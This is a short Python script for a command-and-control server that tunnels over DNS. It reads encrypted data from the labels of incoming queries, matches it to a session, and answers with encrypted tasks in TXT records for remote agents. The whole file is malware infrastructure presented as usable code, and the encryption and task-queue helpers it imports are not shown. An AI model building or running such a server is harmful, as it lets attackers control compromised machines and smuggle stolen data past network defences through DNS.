import dnslib
import socket
import queue_store
import crypto
import os

KEY = bytes.fromhex(os.getenv("C2_KEY"))  # load key from environment variable

def handle_query(data, addr, sock):
    request = dnslib.DNSRecord.parse(data)
    qname = str(request.q.qname)          # e.g. "a3f8c2d9.session123.c2.local."
    
    parts = qname.split(".")
    encrypted_data = bytes.fromhex(parts[0])   # first label = encrypted payload
    session_id = parts[1]                       # second label = session id

    # step 1 — decrypt incoming data
    message = crypto.decrypt(encrypted_data, KEY)

    # step 2 — get next task for this session
    task = queue_store.get_next_task(session_id)
    if task is None:
        task = "WAIT"                      # no tasks queued, tell agent to wait

    # step 3 — encrypt task and send back as TXT record
    encrypted_task = crypto.encrypt(task, KEY)
    reply = request.reply()
    reply.add_answer(dnslib.RR(
        qname,
        dnslib.QTYPE.TXT,
        rdata=dnslib.TXT(encrypted_task.hex())
    ))
    sock.sendto(reply.pack(), addr)

def start_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 53))
    print("C2 server listening on UDP :53")
    while True:
        data, addr = sock.recvfrom(512)    # 512 bytes = max DNS packet size
        handle_query(data, addr, sock)

if __name__ == "__main__":
    start_server()